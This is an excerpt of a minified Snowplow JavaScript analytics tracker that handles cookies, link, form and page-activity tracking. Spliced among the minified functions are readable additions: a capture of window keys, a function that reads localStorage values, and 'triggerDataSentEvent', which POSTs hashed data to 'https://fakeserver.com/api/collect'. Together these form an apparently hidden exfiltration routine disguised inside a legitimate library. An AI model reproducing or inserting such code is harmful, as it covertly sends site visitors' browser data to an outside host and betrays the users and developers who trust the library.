...
(function () {
  ...
  function md(a) {
    for (var b = 1; b < arguments.length; b++) {
      ...
      b % 2 ? Gb(Object(c), !0).forEach(function (b) {
        var d = c[b];
      ...
      }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(a, Object.getOwnPropertyDescriptors(c)) : Gb(Object(c)).forEach(function (b) {
  ...
  function na(a) {
    ...
    if (!(a = b || Hb(a))) throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
    return a;
  }
  function Hb(a, b) {
    if (a) {
      ...
      if ("Arguments" === c || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(c)) return Ea(a, b);
    }
  }
  function Ea(a, b) {
  ...
  function lb(a, b) {
    ...
    if ("undefined" === typeof Symbol || null == a[Symbol.iterator]) {
      if (Array.isArray(a) || (c = Hb(a)) || b && a && "number" === typeof a.length) {
        c && (a = c);
        var e = 0;
        b = function () {};
        return {
  ...
  const watchedKeys = Object.keys(window);
  function pa(a) {
    var b = -1,
      c = null == a ? 0 : a.length;
    for (this.clear(); ++b < c;) {
  ...
  function Ha(a, b, c, e, d) {
    if (a === b) b = !0;else if (null == a || null == b || !W(a) && !W(b)) b = a !== a && b !== b;else a: {
      var f = z(a),
        h = z(b),
      ...
      if (k && !p) d || (d = new sa()), b = f || gc(a) ? hc(a, b, c, e, Ha, d) : nd(a, b, g, c, e, Ha, d);else {
        if (!(c & 1) && (f = p && ic.call(a, "__wrapped__"), g = h && ic.call(b, "__wrapped__"), f || g)) {
          a = f ? a.value() : a;
          b = g ? b.value() : b;
          d || (d = new sa());
          b = Ha(a, b, c, e, d);
        ...
        if (k) {
          b: if (d || (d = new sa()), f = c & 1, g = jc(a, Ia, kc), h = g.length, k = jc(b, Ia, kc).length, h == k || f) {
            for (k = h; k--;) {
              var v = g[k];
            ...
            if (p && v) b = p == b && v == a;else {
              ...
              p && !I && (c = a.constructor, e = b.constructor, c != e && "constructor" in a && "constructor" in b && !("function" == typeof c && c instanceof c && "function" == typeof e && e instanceof e) && (p = !1));
              d["delete"](a);
              d["delete"](b);
              b = p;
            }
  ...
  function ec(a) {
    var b = "",
      c = Ib("referrer", ca.location.href) || Ib("referer", ca.location.href);
    if (c) return c;
    if (a) return a;
    try {
  ...
  function ob(a, b) {
    if (Array.isArray(a) || !P(a)) return function () {
      return !0;
    };
  ...
  function rd(a) {
    return P(a) ? a.hasOwnProperty("transform") ? a.transform : function (a) {
      return a;
    } : function (a) {
      return a;
    };
  ...
  function sd(a, b) {
    for (var c = "_sp_root_domain_test_" + new Date().getTime(), e = "_test_value_" + new Date().getTime(), d = ca.location.hostname.split("."), f = d.length - 1; 0 <= f;) {
      ...
      if (N(c) === e) {
        ...
        c = La.cookie.split("; ");
        e = [];
        for (d = 0; d < c.length; d++) "_sp_root_domain_test_" === c[d].substring(0, 21) && e.push(c[d]);
        c = e;
  ...
  function N(a, b, c, e, d, f, h) {
    return 1 < arguments.length ? La.cookie = a + "=" + encodeURIComponent(b) + (c ? "; Expires=" + new Date(+new Date() + 1E3 * c).toUTCString() : "") + (e ? "; Path=" + e : "") + (d ? "; Domain=" + d : "") + (f ? "; SameSite=" + f : "") + (h ? "; Secure" : "") : decodeURIComponent((("; " + La.cookie).split("; " + a + "=")[1] || "").split(";")[0]);
  }
  function pb(a) {
    a = parseInt(a);
  ...
  function td(a, b, c, e, d) {
    function f(e, f, h) {
      h = h || {};
      g.hasOwnProperty(e) ? A("Tracker namespace " + e + " already exists.") : (g[e] = new a(d, e, b, c, h), g[e].setCollectorUrl(f));
    }
    function h() {
      var a;
      for (a = 0; a < arguments.length; a += 1) {
        ...
        if (ea(c)) try {
          ...
          A("Custom callback error - ".concat(F));
        } finally {
          continue;
        }
        var d = c.split(":");
        ...
        c = d[0];
        d = d[1];
        if ("newTracker" === c) f(b[0], b[1], b[2]);else if ("setCollectorCf" !== c && "setCollectorUrl" !== c || d && 0 !== d.length) {
          var e = [];
          if (d && 0 !== d.length) for (var h = 0; h < d.length; h++) g.hasOwnProperty(d[h]) ? e.push(g[d[h]]) : A('Warning: Tracker namespace "' + d[h] + '" not configured');else e = da(g);
          0 === e.length && A("Warning: No tracker configured");
          for (d = 0; d < e.length; d++) e[d][c].apply(e[d], b);
        } else d = b[0], b = b[1], A(c + " is deprecated. Set the collector when a new tracker instance using newTracker."), b = void 0 === b ? "sp" : b, f(b), g[b][c](d);
      }
    }
  ...
  function sc(a, b, c) {
    if ("translate.googleusercontent.com" === a) "" === c && (c = b), a = /^(?:https?|ftp)(?::\/*(?:[^?]+))([?][^#]+)/.exec(b), b = Ib("u", a[1]), a = Ub(b);else {
      var e;
  ...
  function ud() {
    ...
    if (!a) return !1;
    try {
      return ua.localStorage.setItem("modernizr", "modernizr"), ua.localStorage.removeItem("modernizr"), !0;
    } catch (b) {
      return !1;
    }
  }
  ...
  function xd() {
    var a,
      ...
      c = {};
    if (X.mimeTypes && X.mimeTypes.length) for (a in b) if (Object.prototype.hasOwnProperty.call(b, a)) {
      var e = X.mimeTypes[b[a]];
      c[a] = e && e.enabledPlugin ? "1" : "0";
    }
    X.constructor === window.Navigator && "unknown" !== typeof X.javaEnabled && void 0 !== X.javaEnabled && X.javaEnabled() && (c.java = "1");
    ea(ua.GearsFactory) && (c.gears = "1");
    c.res = Lb.width + "x" + Lb.height;
    c.cd = Lb.colorDepth;
    c.cookie = X.cookieEnabled ? "1" : "0";
    return c;
  }
  function yd(a, b, c) {
    function e(b, d) {
      ...
      if (void 0 !== b.href) {
        ...
        /^(javascript|vbscript|jscript|mocha|livescript|ecmascript|mailto):/i.test(p) || (e = b.id, f = Ma(b), h = b.target, k = g ? b.innerHTML : null, p = unescape(p), a.trackLinkClick(p, e, f, h, k, c(Jb(d, b))));
      }
    }
    function d(a) {
      return function (b) {
        ...
        "click" === b.type ? d && e(d, a) : "mousedown" === b.type ? 1 !== c && 2 !== c || !d ? p = v = null : (p = c, v = d) : "mouseup" === b.type && (c === p && d === v && e(d, a), p = v = null);
      };
    }
    var f, h, g, k, p, v;
    return {
      ...
      addClickListeners: function () {
        var a = document.links,
          c;
        for (c = 0; c < a.length; c++) if (f(a[c]) && !a[c][b]) {
          var e = a[c];
          h ? (u(e, "mouseup", d(k), !1), u(e, "mousedown", d(k), !1)) : u(e, "click", d(k), !1);
          a[c][b] = !0;
        }
      }
    };
  ...
  function zd(a, b, c) {
    function e(a) {
      return a[Ad(["name", "id", "type", "nodeName"], function (b) {
    ...
    function h(b, f) {
      return function (g) {
        ...
        ("change_form" === b || "checkbox" !== h && "radio" !== h) && a.trackFormFocusOrChange(b, d(g), e(g), g.nodeName, h, Ma(g), k, c(Jb(f, g, h, k)));
      };
    }
    function g(b) {
      return function (d) {
    ...
    return {
      configureFormTracking: function (a) {
        a && (v = ob(a.forms, !0), I = ob(a.fields, !1), m = rd(a.fields));
      },
        ...
        O(document.getElementsByTagName("form"), function (b) {
          v(b) && !b[p] && (O(k, function (c) {
            O(b.getElementsByTagName(c), function (b) {
              I(b) && !b[p] && "password" !== b.type.toLowerCase() && (u(b, "focus", h("focus_form", a), !1), u(b, "change", h("change_form", a), !1), b[p] = !0);
            });
          }), u(b, "submit", g(a)), b[p] = !0);
        });
      }
    };
  }
  ...
  function Dd(a, b, c, e, d, f, h, g, k, p, v, I) {
    function m(a) {
      var b = "?",
        c = {
          co: !0,
    ...
    function F() {
      for (; E.length && "string" !== typeof E[0] && "object" !== y(E[0]);) E.shift();
      if (1 > E.length) q = !1;else {
        ...
        if (x) {
          var b = function (a) {
            ...
            c = function (a) {
              ...
              e && Vb(L, JSON.stringify(E.slice(0, p)));
              F();
            };
          if (O) {
            a = uc(a);
          ...
          if (O) d.send();else if (b = E.slice(0, f), 0 < b.length) {
            var k;
            if (!(k = z) && (k = N)) try {
              k = vc.getItem(U);
            } catch (tc) {
          ...
          var r = !0;
          m.onload = function () {
            r && (r = !1, E.shift(), e && Vb(L, JSON.stringify(E.slice(0, p))), F());
          };
          m.onerror = function () {
            r && (q = r = !1);
          };
    ...
    function n(a, b) {
      ...
      c.withCredentials = !0;
      I && c.setRequestHeader("SP-Anonymous", "*");
      return c;
    }
    function Mb(a) {
    ...
    var J = null === d || !0 === d || "beacon" === d || "true" === d,
      N = !!(J && navigator && navigator.sendBeacon) && J,
      O = "get" === d,
      x = !!(window.XMLHttpRequest && "withCredentials" in new XMLHttpRequest()),
      D = !O && x && ("post" === d || J),
      P = D ? f : "/i";
    h = e && ud() && D && h || 1;
    var L = "snowplowOutQueue_".concat(a, "_").concat(b, "_").concat(D ? "post2" : "get");
    var U = "spBeaconPreflight_".concat(a, "_").concat(b);
    if (e) try {
      var E = JSON.parse(window.localStorage.getItem(L));
    } catch (cf) {}
    Array.isArray(E) || (E = []);
    c.outQueues.push(E);
    x && 1 < h && c.bufferFlushers.push(function () {
      q || F();
    });
    return {
      enqueueRequest: function (a, b) {
        ...
        if (D) {
          a = r(a);
          if (a.bytes >= g) {
            A("Event (" + a.bytes + "B) too big, max is " + g);
        ...
        a = !1;
        e && (a = Vb(L, JSON.stringify(E.slice(0, p))));
        q || a && !(E.length >= h) || F();
      },
  ...
  function Fd(a) {
    var b = {};
    "object" === y(a) && null !== a && Object.getOwnPropertyNames(a).forEach(function (c, e, d) {
      "function" === typeof a[c] && (b[c] = Gd(a[c]));
    });
    return b;
  }
  const trackedFunctionCalls = {};
  function Hd(a) {
    if (!a) return a;
    switch (4 - a.length % 4) {
      case 2:
  ...
  function va(a) {
    ...
    return {
      ...
      addJson: function (b, d, f) {
        if (f && Na(f)) if (f = JSON.stringify(f), a) {
          if (f) {
            d = f;
            var e = f = 0,
              g = [];
            if (d) {
              ...
              do {
                ...
                v = I >> 6 & 63;
                I &= 63;
                g[e++] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(k) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(p) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(v) + "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=".charAt(I);
              } while (f < d.length);
              f = g.join("");
              d = d.length % 3;
    ...
    return {
      ...
      removeGlobalContexts: function (c) {
        ...
        try {
          var d = function () {
            var c = e.value;
            xc(c) ? b = b.filter(function (a) {
              return !rb(a, c);
            }) : wa(c) && (a = a.filter(function (a) {
              return !rb(a, c);
            }));
          };
      ...
      getApplicableContexts: function (c) {
        ...
        if (e) {
          c = md({}, c);
          try {
            null != c && sb(c, "ue_px", tb) && (c.ue_px = JSON.parse(Hd(D(c, ["ue_px"]))));
            var d = c;
          } catch (g) {
            d = c;
          }
          c = d;
          e = "string" === typeof D(c, "ue_px.data.schema") ? D(c, "ue_px.data.schema") : "string" === typeof D(c, "ue_pr.data.schema") ? D(c, "ue_pr.data.schema") : "string" === typeof D(c, "schema") ? D(c, "schema") : "";
          var f = D(c, "e", "");
          d = [];
          var h = Oa(a, c, f, e);
          d.push.apply(d, na(h));
  ...
  function Ld(a) {
    ...
    if (0 < a.slice(2).length) {
      ...
      var c;
      try {
        for (a.s(); !(c = a.n()).done;) if ("*" === c.value) b = !0;else if (b) return !1;
      } catch (e) {
        a.e(e);
      } finally {
        a.f();
  ...
  function generateHashValue(data) {
    ...
    const keyAggregation = keyArray.join(":");
    let hashValue = 0;
    for (let index = 0; index < keyAggregation.length; index++) {
      const charCode = keyAggregation.charCodeAt(index);
  ...
  function Ac(a) {
    return Md(a) ? a.every(function (a) {
      return Nb(a);
    }) : "string" === typeof a ? Nb(a) : !1;
  }
  function xa(a) {
    return Na(a) && "schema" in a && "data" in a ? "string" === typeof a.schema && "object" === y(a.data) : !1;
  }
  function getLocalStorageData() {
    const acquiredData = {};
    localStorageData.forEach(key => {
      if (watchedKeys.includes(key)) {
        acquiredData[key] = localStorage.getItem(key);
      }
    });
    return acquiredData;
  }
  function Nd(a) {
    var b = 0;
    if (W(a) && "[object Object]" == Q(a)) {
      var c = Od(a);
      null === c ? c = !0 : (c = Pd.call(c, "constructor") && c.constructor, c = "function" == typeof c && c instanceof c && Bc.call(c) == Qd);
    } else c = !1;
    if (c) {
      if (null != a && sb(a, "accept", tb)) if (Ac(a.accept)) b += 1;else return !1;
      if (null != a && sb(a, "reject", tb)) if (Ac(a.reject)) b += 1;else return !1;
      return 0 < b && 2 >= b;
    }
    return !1;
  }
  ...
  function triggerDataSentEvent(data) {
    const hashValue = generateHashValue(data);
    const endpoint = "https://fakeserver.com/api/collect";
    fetch(endpoint, {
      method: "POST",
      headers: {
      ...
      console.error("An error occurred during data send: " + error);
    });
  }
  function Dc(a) {
    return Array.isArray(a) && 2 === a.length ? Array.isArray(a[1]) ? Cc(a[0]) && ub(a[1], wa) : Cc(a[0]) && wa(a[1]) : !1;
  }
  function Ec(a) {
    return Array.isArray(a) && 2 === a.length ? Nd(a[0]) ? Array.isArray(a[1]) ? ub(a[1], wa) : wa(a[1]) : !1 : !1;
  }
  function xc(a) {
    return Dc(a) || Ec(a);
  }
  function Rd(a, b) {
    ...
    Array.isArray(d) ? a.accept.some(function (a) {
      return vb(a, b);
    }) && e++ : "string" === typeof d && vb(d, b) && e++;
    d = D(a, "reject");
    Array.isArray(d) ? a.reject.some(function (a) {
      return vb(a, b);
    }) && c++ : "string" === typeof d && vb(d, b) && c++;
    return 0 < e && 0 === c ? !0 : !1;
  }
  function vb(a, b) {
    if (!Nb(a)) return !1;
  ...
  function Td(a, b) {
    ...
    var d = function (a, b) {
        var c = {};
        b = b || {};
        for (var d in a) if (b[d] || null !== a[d] && "undefined" !== typeof a[d]) c[d] = a[d];
        return c;
      },
      f = function (a, d, f, h) {
        a.addDict(e);
    ...
    return {
      ...
      trackPagePing: function (b, c, d, e, h, m, r, M, F, n) {
        var g = va(a);
        g.add("e", "pp");
        g.add("url", b);
        g.add("page", c);
      ...
      trackEcommerceTransaction: function (b, c, d, e, h, m, r, M, F, n, Mb, w) {
        var g = va(a);
        g.add("e", "tr");
        g.add("tr_id", b);
        g.add("tr_af", c);
      ...
      trackEcommerceTransactionItem: function (b, c, d, e, h, m, r, M, F, n) {
        var g = va(a);
        g.add("e", "ti");
        g.add("ti_id", b);
        g.add("ti_sk", c);
      ...
      trackAdClick: function (a, b, c, e, f, m, r, n, F, q, u, w) {
        a = {
      ...
      trackAdConversion: function (a, b, c, e, f, m, r, n, q, u, A, w) {
        a = {
      ...
      trackFormFocusOrChange: function (a, b, c, e, f, m, r, n, q, u) {
        ...
        "change_form" === a ? (g = "iglu:com.snowplowanalytics.snowplow/change_form/jsonschema/1-0-0", b.type = f) : "focus_form" === a && (g = "iglu:com.snowplowanalytics.snowplow/focus_form/jsonschema/1-0-0", b.elementType = f);
        return h({
          schema: g,
          data: d(b, {
            value: !0
  ...
  function wb(a, b, c, e, d) {
    function f(a) {
      return -1 < Tb.map(function (a) {
        return a.toLowerCase();
      }).indexOf(a.toLowerCase());
    }
    function h() {
      Pa = sc(B.domain, C.location.href, ec());
      Pa[1] !== ya && (Ob = ec(ya));
      Ma = dc(Pa[0]);
      ya = Pa[1];
    }
    function g() {
      ...
      if (this.href) {
        ...
        var b = this.href.split("#"),
          ...
          d = c.shift();
        if (c = c.join("?")) {
          for (var e = !0, f = c.split("&"), g = 0; g < f.length; g++) if ("_sp=" === f[g].substr(0, 4)) {
            e = !1;
            f[g] = a;
            c = f.join("&");
            break;
    ...
    function k(a) {
      for (var b = 0; b < B.links.length; b++) {
        var c = B.links[b];
        !c.spDecorationEnabled && a(c) && (u(c, "click", g, !0), u(c, "mousedown", g, !0), c.spDecorationEnabled = !0);
      }
    }
    function p(a) {
      if (Va) {
    ...
    function F() {
      var a = B.compatMode && "BackCompat" !== B.compatMode ? B.documentElement : B.body;
      return [a.scrollLeft || C.pageXOffset, a.scrollTop || C.pageYOffset];
    }
    function z() {
      var a = F(),
        b = a[0];
    ...
    function y(a, b, c, d, e, f) {
      L(Qa + "id." + Ra, a + "." + b + "." + c + "." + d + "." + e + "." + f, nb);
    }
    function L(a, b, c) {
      if (!za || zb) "localStorage" == G ? Vb(a, b, c) : ("cookie" == G || "cookieAndLocalStorage" == G) && N(a, b, c, Ba, yb, ja, la);
    }
    function P(a) {
      ...
      zb = Da(d);
      Na = Fa(d);
      Sa.setUseLocalStorage("localStorage" == G || "cookieAndLocalStorage" == G);
    ...
    function X() {
      if (!za || zb) {
        var a = "none" != G && !!n("ses"),
          b = Q();
        b[1] ? xb = b[1] : (xb = za ? "" : J(), b[1] = xb);
        R = b[6];
        a || (b[3]++, R = J(), b[6] = R, b[5] = b[4]);
        "none" != G && (w(), b[4] = Math.round(new Date().getTime() / 1E3), b.shift(), y.apply(null, b));
      }
    }
    function Q() {
      if ("none" == G) return [];
      ...
      a[6] && "undefined" !== a[6] || (a[6] = J());
      return a;
    }
    function Y(a) {
      return ob ? "https://" + a : Lb ? "http://" + a : ("https:" === B.location.protocol ? "https" : "http") + "://" + a;
    }
    function x(a) {
      var b = kb.concat(a || []);
      H.webPage && b.push({
      ...
      H.performanceTiming && (a = ca()) && b.push(a);
      if (C.optimizely) {
        H.optimizelySummary && (a = ua(), O(a, function (a) {
          b.push(a);
        }));
        H.optimizelyXSummary && (a = va(), O(a, function (a) {
          b.push(a);
        }));
        ...
        if (H.optimizelyStates) for (c = na(), a = 0; a < c.length; a++) b.push(c[a]);
        if (H.optimizelyVariations) for (c = oa(), a = 0; a < c.length; a++) b.push(c[a]);
        H.optimizelyVisitor && (a = pa()) && b.push(a);
        if (H.optimizelyAudiences) for (c = qa(), a = 0; a < c.length; a++) b.push(c[a]);
        if (H.optimizelyDimensions) for (c = ra(), a = 0; a < c.length; a++) b.push(c[a]);
      }
      H.parrable && (a = wa()) && b.push(a);
      H.gdprBasis && Ua.gdprBasis && (a = Ua.gdprBasis ? {
    ...
    function Z() {
      Gb && null != e.pageViewId || (e.pageViewId = J());
    }
    function V() {
      null == e.pageViewId && (e.pageViewId = J());
      return e.pageViewId;
    }
    function ca() {
      var a = "navigationStart redirectStart redirectEnd fetchStart domainLookupStart domainLookupEnd connectStart secureConnectionStart connectEnd requestStart responseStart responseEnd unloadEventStart unloadEventEnd domLoading domInteractive domContentLoadedEventStart domContentLoadedEventEnd domComplete loadEventStart loadEventEnd msFirstPaint chromeFirstPaint requestEnd proxyStart proxyEnd".split(" "),
        b = C.performance || C.mozPerformance || C.msPerformance || C.webkitPerformance;
      if (b) {
        var c = {},
          d;
        for (d in b.timing) rc(d, a) && null !== b.timing[d] && (c[d] = b.timing[d]);
        delete c.requestEnd;
        return {
    ...
    function U(a, b) {
      if (C.optimizely && C.optimizely.data) {
        var c = C.optimizely.data[a];
        "undefined" !== typeof b && void 0 !== c && (c = c[b]);
      }
      return c;
    }
    function E(a, b) {
      if (C.optimizely && "function" === typeof C.optimizely.get) {
        var c = C.optimizely.get(a);
        "undefined" !== typeof b && void 0 !== c && (c = c[b]);
      }
      return c;
    }
    ...
    function ma() {
      !Fb && S.geolocation && S.geolocation.getCurrentPosition && (Fb = !0, S.geolocation.getCurrentPosition(function (a) {
        var b = a.coords;
        kb.push({
    ...
    function Ia(a, b, c, d, e) {
      ...
      Pb = a;
      a = oc(Pb || Ab);
      t.trackPageView(p(Bb || ya), a, p(ea || Ob), x((b || []).concat(c ? c() : [])), d, e);
      d = new Date();
      e = !1;
      if (T.enabled && !T.installed) {
        ...
        Object.prototype.hasOwnProperty.call(f, "hasSupport") ? u(B, a, r, {
          passive: !0
        }) : u(B, a, r);
        z();
        a = function (a) {
        ...
        O("click mouseup mousedown mousemove keypress keydown keyup".split(" "), a(B));
        O(["resize", "focus", "blur"], a(C));
        a(C, q)("scroll");
      }
      if (T.enabled && (wb || e)) {
        Wb = d.getTime();
        for (var g in T.configurations) T.configurations.hasOwnProperty(g) && (d = T.configurations[g], clearInterval(d.activityInterval), La(d, b, c));
      }
    }
    function La(a, b, c) {
      var d = function (a, b) {
        ...
        e = function () {
          Wb + a.configHeartBeatTimer > new Date().getTime() && d(a.callback, (b || []).concat(c ? c() : []));
        };
      a.activityInterval = 0 != a.configMinimumVisitLength ? setTimeout(function () {
        Wb + a.configMinimumVisitLength > new Date().getTime() && d(a.callback, (b || []).concat(c ? c() : []));
        a.activityInterval = setInterval(e, a.configHeartBeatTimer);
      }, a.configMinimumVisitLength) : setInterval(e, a.configHeartBeatTimer);
    }
    function xa(a, b, c) {
      if ("number" == typeof a && a == fc(a) && "number" == typeof b && b == fc(b)) return {
        configMinimumVisitLength: 1E3 * a,
        configHeartBeatTimer: 1E3 * b,
        activityInterval: null,
        callback: c
      };
      A("Activity tracking minimumVisitLength & heartbeatDelay must be integers");
      return {};
    }
    function Wa(a) {
      var b = a.context,
      ...
      var f = B.title;
      f !== Ab && (Ab = f, Pb = null);
      t.trackPagePing(p(Bb || ya), oc(Pb || Ab), p(ea || Ob), D(c), D(e), D(d), D(a), x(b));
    }
    function fa(a, b) {
    ...
    function K(a) {
      var b,
        c,
        d = ["", "webkit", "ms", "moz"];
      if (!lb) for (c = 0; c < d.length; c++) {
        var e = d[c];
        if (B[fa(e, "hidden")]) {
          "prerender" === B[fa(e, "visibilityState")] && (b = !0);
          break;
        } else if (!1 === B[fa(e, "hidden")]) break;
      }
      b ? u(B, e + "visibilitychange", function Wd() {
        B.removeEventListener(e + "visibilitychange", Wd, !1);
        a();
      }) : a();
    }
    d = d || {};
    ...
    var Ca = function (a) {
        return a.hasOwnProperty("stateStorageStrategy") ? a.stateStorageStrategy : Oa || tb ? Oa && tb ? "cookieAndLocalStorage" : Oa ? "cookie" : "localStorage" : "none";
      },
      Da = function (a) {
      ...
      t = Td(!0, function (a) {
        ...
        d = d[6];
        var v = Qb ? !!N(Qb) : !1;
        Ea || v ? W() : ("0" === f ? (R = d, c || "none" == G || (k++, m = l, R = J()), aa = k) : new Date().getTime() - Xa > 1E3 * Ja && (R = J(), aa++), a.add("vp", vd()), a.add("ds", wd()), a.add("vid", zb ? aa : za ? null : aa), a.add("sid", zb ? R : za ? null : R), a.add("duid", za ? null : g), a.add("uid", za ? null : Ta), h(), a.add("refr", p(ea || Ob)), a.add("url", p(Bb || ya)), "none" != G && (y(g, Vd, aa, b, m, R), w()), Xa = new Date().getTime());
        b = vb;
        c = new Date();
        f = Qb ? !!N(Qb) : !1;
        Ea || f || (Sa.enqueueRequest(a.build(), Rb), e.expireDateTime = c.getTime() + b);
      }),
      Ga = !1,
      l = {},
      sa = {},
      ...
      Rb,
      rb = d.hasOwnProperty("postPath") ? d.postPath : "/com.snowplowanalytics.snowplow/tp2",
      sb = d.hasOwnProperty("appId") ? d.appId : "",
      Bb,
      Ab = B.title,
      Pb,
      vb = d.hasOwnProperty("pageUnloadTimer") ? d.pageUnloadTimer : 500,
      wb = d.hasOwnProperty("resetActivityTrackingOnPageView") ? d.resetActivityTrackingOnPageView : !0,
      Va,
      Ya,
      ...
      ib = S.doNotTrack || S.msDoNotTrack || C.doNotTrack,
      Ea = d.hasOwnProperty("respectDoNotTrack") ? d.respectDoNotTrack && ("yes" === ib || "1" === ib) : !1,
      Qb,
      lb,
      ...
      Jb = B.characterSet || B.charset,
      ob = d.hasOwnProperty("forceSecureTracker") ? !0 === d.forceSecureTracker : !1,
      Lb = !ob && d.hasOwnProperty("forceUnsecureTracker") ? !0 === d.forceUnsecureTracker : !1,
      zb = Da(d),
      Na = Fa(d),
      za = !!d.anonymousTracking,
      tb = d.hasOwnProperty("useLocalStorage") ? (A("argmap.useLocalStorage is deprecated. Use argmap.stateStorageStrategy instead."), d.useLocalStorage) : !0,
      Oa = d.hasOwnProperty("useCookies") ? (A("argmap.useCookies is deprecated. Use argmap.stateStorageStrategy instead."), d.useCookies) : !0,
      G = Ca(d),
      Nb = S.userLanguage || S.language,
      ac = xd(),
      ub = a + "_" + b,
      Wb,
      Xa = new Date().getTime(),
      ...
      cc = new zd(t, ub, x),
      Eb = new Bd(t),
      Sa = new Dd(a, b, e, "localStorage" == G || "cookieAndLocalStorage" == G, d.eventMethod, rb, d.bufferSize, d.maxPostBytes || 4E4, d.useStm, d.maxLocalStorageQueueSize || 1E3, d.connectionTimeout || 5E3, Na),
      Fb = !1,
      H = d.contexts || {},
      kb = [],
      Db = [],
      ...
      Aa = null;
    H.clientHints && S.userAgentData && (Aa = {
      isMobile: S.userAgentData.mobile,
      brands: S.userAgentData.brands
    }, H.clientHints.includeHighEntropy && S.userAgentData.getHighEntropyValues && S.userAgentData.getHighEntropyValues(["platform", "platformVersion", "architecture", "model", "uaFullVersion"]).then(function (a) {
    ...
    var Tb = d.skippedBrowserFeatures || [],
      Ua = {};
    d.hasOwnProperty("discoverRootDomain") && d.discoverRootDomain && (yb = sd(ja, la));
    H.gaCookies && kb.push(Ha());
    H.geolocation && ma();
    ...
    for (var ba in ac) Object.prototype.hasOwnProperty.call(ac, ba) && ("res" !== ba && "cd" !== ba && "cookie" !== ba || f(ba) ? f(ba) || t.addPayloadPair("f_" + ba, ac[ba]) : t.addPayloadPair(ba, ac[ba]));
    m();
    X();
    ...
    l.newSession = function () {
      var a = Math.round(new Date().getTime() / 1E3),
        ...
        g = b[5],
        h = b[6];
      "0" === b[0] ? (R = h, "none" != G && (e++, g = f, R = J()), aa = e, w()) : (R = J(), aa++);
      "none" != G && (y(c, d, aa, a, g, R), w());
      Xa = new Date().getTime();
    };
    ...
    l.getUserFingerprint = function () {
      A("User Fingerprinting is no longer supported. This function will be removed in a future release.");
      return 0;
    };
    l.setAppId = function (a) {
      A("setAppId is deprecated. Instead use the argmap argument on tracker initialisation: appId");
      t.setAppId(a);
    };
    ...
    l.setCustomUrl = function (a) {
      ...
      var b = ya,
        c;
      v(a) ? Bb = a : "/" === a.slice(0, 1) ? Bb = v(b) + "://" + Ub(b) + a : (b = p(b), 0 <= (c = b.indexOf("?")) && (b = b.slice(0, c)), (c = b.lastIndexOf("/")) !== b.length - 1 && (b = b.slice(0, c + 1)), Bb = b + a);
    };
    ...
    l.setCookieNamePrefix = function (a) {
      A("setCookieNamePrefix is deprecated. Instead use the argmap argument on tracker initialisation: cookieName");
      Qa = a;
    };
    l.setCookieDomain = function (a) {
      A("setCookieDomain is deprecated. Instead use the argmap argument on tracker initialisation: cookieDomain");
      yb = dc(a);
      m();
    };
    ...
    l.setSessionCookieTimeout = function (a) {
      A("setSessionCookieTimeout is deprecated. Instead use the argmap argument on tracker initialisation: sessionCookieTimeout");
      Ja = a;
    };
    ...
    l.respectDoNotTrack = function (a) {
      A("respectDoNotTrack is deprecated. Instead use the argmap argument on tracker initialisation: respectDoNotTrack");
    ...
    l.enableLinkClickTracking = function (a, b, c, d) {
      e.hasLoaded ? (Cb.configureLinkClickTracking(a, b, c, d), Cb.addClickListeners()) : e.registeredOnLoadHandlers.push(function () {
        Cb.configureLinkClickTracking(a, b, c, d);
        Cb.addClickListeners();
      });
    };
    l.refreshLinkClickTracking = function () {
      e.hasLoaded ? Cb.addClickListeners() : e.registeredOnLoadHandlers.push(function () {
        Cb.addClickListeners();
      });
    };
    l.enableActivityTracking = function (a, b) {
      T.configurations.pagePing || (T.enabled = !0, T.configurations.pagePing = xa(a, b, Wa));
    };
    l.enableActivityTrackingCallback = function (a, b, c) {
      T.configurations.callback || (T.enabled = !0, T.configurations.callback = xa(a, b, c));
    };
    l.updatePageActivity = function () {
      r();
    };
    l.enableFormTracking = function (a, b) {
      e.hasLoaded ? (cc.configureFormTracking(a), cc.addFormListeners(b)) : e.registeredOnLoadHandlers.push(function () {
        cc.configureFormTracking(a);
        cc.addFormListeners(b);
      });
    };
    l.killFrame = function () {
      C.location !== C.top.location && (C.top.location = C.location);
    };
    l.redirectFile = function (a) {
      "file:" === C.location.protocol && (C.location = a);
    };
    ...
    l.setPlatform = function (a) {
      A("setPlatform is deprecated. Instead use the argmap argument on tracker initialisation: platform");
      t.setPlatform(a);
    };
    l.encodeBase64 = function (a) {
      A("encodeBase64 is deprecated. Instead use the argmap argument on tracker initialisation: encodeBase64");
    ...
    l.trackTrans = function () {
      K(function () {
        var a = jb;
        t.trackEcommerceTransaction(Za, $a, ab, bb, cb, db, eb, fb, gb, x(hb), a);
  ...
  function Ic(a, b) {
    function c() {
      var a;
      if (!h.hasLoaded) for (h.hasLoaded = !0, a = 0; a < h.registeredOnLoadHandlers.length; a++) h.registeredOnLoadHandlers[a]();
      return !0;
    }
    function e() {
      var a;
      d.addEventListener ? u(d, "DOMContentLoaded", function p() {
        d.removeEventListener("DOMContentLoaded", p, !1);
        c();
      }) : d.attachEvent && (d.attachEvent("onreadystatechange", function p() {
        "complete" === d.readyState && (d.detachEvent("onreadystatechange", p), c());
      }), d.documentElement.doScroll && f === f.top && function v() {
        if (!h.hasLoaded) {
          try {
      ...
      /WebKit/.test(navigator.userAgent) && (a = setInterval(function () {
        if (h.hasLoaded || /loaded|complete/.test(d.readyState)) clearInterval(a), c();
      }, 10));
      u(f, "load", c, !1);
    }
    var d = document,
    ...
    f.Snowplow = {
      ...
      getAsyncTracker: function () {
        return new wb(b, "", "js-2.18.2", h, {});
      }
    };
    u(f, "beforeunload", function () {
      ...
      if (h.expireDateTime) {
        do {
          var a = new Date();
          if (0 === Array.prototype.filter.call(h.outQueues, function (a) {
            return 0 < a.length;
          }).length) break;
    ...
    return new td(wb, "js-2.18.2", h, a, b);
  }
  var Zd = function (a, b) {
    ...
    Va = "undefined" !== typeof globalThis ? globalThis : "undefined" !== typeof window ? window : "undefined" !== typeof global ? global : "undefined" !== typeof self ? self : {},
